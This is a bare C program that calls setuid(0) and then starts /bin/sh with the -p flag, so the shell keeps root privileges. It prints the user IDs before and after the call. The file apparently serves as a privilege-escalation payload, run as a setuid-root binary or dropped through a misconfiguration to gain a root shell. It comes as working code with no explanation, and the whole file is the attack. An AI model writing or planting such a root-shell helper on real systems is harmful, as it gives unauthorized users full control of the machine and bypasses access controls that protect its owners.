#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    printf("[*] Before: uid=%d euid=%d\n", getuid(), geteuid());

    if (setuid(0) != 0) {
        perror("setuid");
        return 1;
    }

    printf("[*] After : uid=%d euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "sh", "-p", NULL);
    perror("execl");
    return 1;
}
